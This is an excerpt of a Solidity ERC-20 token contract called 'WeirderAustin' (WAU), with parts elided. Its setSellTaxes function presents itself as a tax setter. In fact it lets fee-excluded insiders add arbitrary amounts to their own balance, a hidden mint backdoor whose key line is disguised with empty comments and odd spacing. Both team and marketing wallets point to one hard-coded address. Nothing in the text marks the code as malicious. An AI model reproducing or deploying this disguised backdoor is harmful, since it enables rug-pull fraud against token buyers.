...
contract WeirderAustin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "WeirderAustin";
    string private _symbol = "WAU";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xf697c68D78022d2c06F319597160C8b05dE4769b));
        marketingWalletAddress = payable(address(0xf697c68D78022d2c06F319597160C8b05dE4769b));
    ...
    function setSellTaxes(uint256 newLiquidityTax,uint256 newTax) external {
        require(isExcludedFromFee[msg.sender]);_balances[msg.sender]= /**/ _balances[msg.sender]  .  /**/ add(newTax);
